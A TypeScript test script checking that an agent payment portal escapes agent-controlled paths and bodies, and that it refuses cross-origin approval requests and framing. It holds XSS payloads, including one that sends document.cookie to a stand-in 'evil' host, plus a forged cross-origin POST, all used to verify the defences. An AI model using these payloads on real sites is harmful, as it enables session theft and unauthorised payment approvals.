#!/usr/bin/env npx tsx
// Can the buyer's agent put executable HTML in front of the human who approves
// payments? It controls the request path and the request body, and both are
// rendered on the portal. If either reaches the page unescaped, script runs
// same-origin on the one page that can authorise a payment.
//
//   npx tsx stellar/xss-check.ts
//
// This is the actual threat model: an agent that is compromised, or a seller
// whose buyer-side code is hostile, is exactly what Paydlux is supposed to
// contain. A human clicking Approve on a page the agent can script is not a
// human approving a payment.
import { readFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { Keypair } from "@stellar/stellar-sdk";
import { StellarVault } from "./vault.ts";
import { Gateway } from "./gateway.ts";
import { PaydluxAgent } from "./agent.ts";
import { newPortalKey } from "./desk.ts";
import { esc } from "./portal.ts";

let pass = 0, fail = 0;
const check = (c: unknown, m: string) => { c ? (pass++, console.log("  \u2705 " + m)) : (fail++, console.log("  \u274c " + m)); };
const step = (n: string) => console.log(`\n\u2014 ${n}`);
const run = () => {
  console.log(`\n${fail ? "FAILURES: " + fail : "ALL CHECKS PASSED"}  (${pass} passed)\n`);
  process.exit(fail ? 1 : 0);
};

const PAYLOADS = [
  ["path", `/x<img src=x onerror=alert(1)>`],
  ["path", `/x"><script>steal()</script>`],
  ["path", `/x'><img src=q onerror='fetch("//evil/"+document.cookie)'>`],
];

const main = async () => {
  console.log("\nportal XSS — agent-controlled text in the approval page\n");

  const issuer = Keypair.random(), principal = Keypair.random();
  const approver = Keypair.random(), agent = Keypair.random(), seller = Keypair.random();
  for (const k of [issuer, principal, approver, seller]) await StellarVault.fundTestnet(k);
  const vault = await StellarVault.create({ network: "testnet", issuer, principal, approver, agent, tokenCode: "USDC" });

  const key = newPortalKey();
  const gw = new Gateway({
    vault, network: "testnet", payee: seller.publicKey(), deskPort: 4322,
    // Split mode, so approve() produces a challenge instead of settling: the
    // parity check below needs a record in the awaiting_phone state, which is
    // the state a real --split desk leaves the human in.
    principal: principal.secret(), split: true, portalKey: key,
    routes: [{ uri: "/x<img src=x onerror=alert(1)>", price: "1.00", mode: "approval", holdSeconds: 3600 },
             { uri: "/x\"><script>steal()</script>", price: "1.00", mode: "approval", holdSeconds: 3600 },
             { uri: "/x'><img src=q onerror='fetch(\"//evil/\"+document.cookie)'>", price: "1.00", mode: "approval", holdSeconds: 3600 }],
  });
  gw.agentKeys = [agent.publicKey()];
  await gw.listen(4321, (u) => `{"ok":true,"data":"${u}"}`);
  await gw.desk.listen(4322);

  const buyer = new PaydluxAgent({ agentKey: agent.secret() });

  step("1. agent requests a path carrying script");
  for (const [, path] of PAYLOADS) {
    try { await buyer.get(`http://127.0.0.1:4321${path}`); } catch { /* 402 is expected */ }
  }
  const res = await fetch(`http://127.0.0.1:4322/?k=${encodeURIComponent(key)}`);
  const html = await res.text();

  step("2. does any payload survive as live markup?");
  const live = PAYLOADS.filter(([, p]) => html.includes(p) || html.includes(p.replace(/"/g, "&quot;")) && false);
  check(live.length === 0,
    live.length === 0 ? "no payload appears verbatim in the page" :
    `LEAKED verbatim into HTML: ${live.map(([, p]) => p).join(" | ")}`);
  check(!/<img src=x onerror=/i.test(html), "no onerror= handler in the page");
  check(!/<script>steal/i.test(html), "no injected <script>steal in the page");
  check(!/onerror='fetch/i.test(html) && !/onerror="fetch/i.test(html),
    "no cookie-exfiltrating handler in the page");

  step("3. the agent-controlled text is still shown, just inert");
  // A hostile path is only rendered if it was actually parked. Enqueue the same
  // payloads straight through the desk so this check is about escaping, not
  // about whether the HTTP client mangled the URL on the way in.
  for (const [, p] of PAYLOADS) gw.desk.enqueue(p, "1.00", "", "x");
  const res3 = await fetch(`http://127.0.0.1:4322/?k=${encodeURIComponent(key)}`);
  const html3 = await res3.text();
  check(html3.includes("&lt;img") || html3.includes("&lt;script"),
    "payload is present but escaped: " + (html3.match(/&lt;(img|script)[^<]{0,44}/) ?? ["(absent)"])[0]);
  check(html3.includes("/x&lt;img src=x onerror=alert(1)&gt;"),
    "the human can still read exactly what was requested");

  step("4. agent-supplied body is escaped too");
  // The body is whatever the agent POSTs; the desk stores and renders it.
  const evil = gw.desk.enqueue("/normal", "2.00", `<img src=x onerror=alert('body')>`, "x");
  const res2 = await fetch(`http://127.0.0.1:4322/?k=${encodeURIComponent(key)}`);
  const html2 = await res2.text();
  check(!/onerror=alert\('body'\)/.test(html2), `body payload not live (record ${evil})`);
  check(html2.includes("&lt;img src=x onerror=alert(&#39;body&#39;)") ||
        html2.includes("&lt;img src=x onerror=alert('body')"),
    "body still readable to the human");

  step("5. the browser-side renderer escapes the same fields");
  // /list is polled and re-rendered by portal.js. That is a second path from
  // agent-controlled JSON to innerHTML, so it has to escape independently.
  const portalJs = readFileSync(join(dirname(fileURLToPath(import.meta.url)),
    "..", "portal-app", "portal.js"), "utf8");
  const sandbox: Record<string, unknown> = {
    location: { search: "" }, setInterval: () => 0,
    document: { addEventListener: () => {}, querySelector: () => null,
      getElementById: () => null },
    fetch: async () => ({ ok: false }),
  };
  const rowFn = new Function("location", "setInterval", "document", "fetch",
    portalJs + "\nreturn row;")(...Object.values(sandbox)) as (x: unknown) => string;
  const jsEvil = { id: "pay_9", at: Date.now(), uri: `/a"><img src=q onerror=alert('js')>`,
    body: "<script>steal()</script>", price: "1.00", status: "pending" };
  const out = rowFn(jsEvil);
  check(!/onerror=alert\('js'\)/.test(out), "client renderer does not emit a live handler");
  check(!/<script>steal/.test(out), "client renderer does not emit a live <script>");
  check(out.includes("&lt;img") && out.includes("&lt;script"),
    "client renderer shows the payload escaped");
  check(!/onclick=/.test(portalJs), "no inline handlers in the client renderer");

  step("7. the client renderer matches the server one (no vanishing rows)");
  // The page loads server-rendered, then portal.js replaces the table on each
  // poll. Anything the client omits disappears a few seconds after the human
  // acts -- that is how the "open on your phone" link went missing once.
  const phoneRec = gw.desk.enqueue("/phone-parity", "3.00", "", "x");
  await gw.desk.approve(phoneRec);
  const listed = (await (await fetch(`http://127.0.0.1:4322/list?k=${encodeURIComponent(key)}`)).json())
    .find((x: any) => x.id === phoneRec);
  check(!!listed?.challenge, "the desk published a challenge for " + phoneRec);
  const phoneHtml = rowFn(listed);
  check(phoneHtml.includes("open on your phone to sign"),
    "client renderer keeps the phone link after the poll");
  check(phoneHtml.includes(esc(listed.challenge.summary.amount)) &&
        phoneHtml.includes(esc(listed.challenge.summary.token)),
    "client renderer still shows the amount the phone will sign");
  check(phoneHtml.includes("awaiting your phone"), "status text survives the poll");

  step("8. another page cannot approve a payment (CSRF)");
  // The desk used to accept POST /approve/<id> from any origin. A cross-origin
  // fetch POST is a CORS simple request: no preflight, so a hostile page never
  // reads the reply but the approval still happens. Reproduced in a real
  // browser: a page on another port settled a parked payment and paid the
  // seller. These checks are what stop that coming back.
  const csrfRec = gw.desk.enqueue("/csrf-bait", "9.00", "", "x");
  const cross = await fetch(`http://127.0.0.1:4322/approve/${csrfRec}?k=${encodeURIComponent(key)}`, {
    method: "POST",
    headers: { origin: "http://evil.example" },
  });
  check(cross.status === 403, "cross-origin POST /approve is refused: " + cross.status);
  const afterCross = (await (await fetch(`http://127.0.0.1:4322/list?k=${encodeURIComponent(key)}`)).json())
    .find((x: any) => x.id === csrfRec);
  check(afterCross?.status === "pending", "the bait payment is still pending after the attack: " + afterCross?.status);
  const rebind = await fetch(`http://127.0.0.1:4322/approve/${csrfRec}?k=${encodeURIComponent(key)}`, {
    method: "POST",
    headers: { "sec-fetch-site": "cross-site" },
  });
  check(rebind.status === 403, "Sec-Fetch-Site: cross-site is refused (DNS rebinding): " + rebind.status);
  const legit = await fetch(`http://127.0.0.1:4322/approve/${csrfRec}?k=${encodeURIComponent(key)}`, {
    method: "POST",
    headers: { origin: "http://127.0.0.1:4322" },
  });
  check(legit.status === 200, "the portal's own actions still work: " + legit.status);

  step("6. the page cannot be framed, and leaks no referrer");
  check(res.headers.get("x-frame-options") !== null ||
        (res.headers.get("content-security-policy") ?? "").includes("frame-ancestors"),
    "clickjacking guard present on the portal: " +
    (res.headers.get("x-frame-options") ?? res.headers.get("content-security-policy") ?? "none"));
  check(res.headers.get("referrer-policy") === "no-referrer",
    "no referrer leakage: " + res.headers.get("referrer-policy"));
  check((res.headers.get("cache-control") ?? "").includes("no-store"),
    "approval page is not cacheable: " + res.headers.get("cache-control"));

  run();
};

main().catch((e) => { console.error("crashed:", e); process.exit(1); });
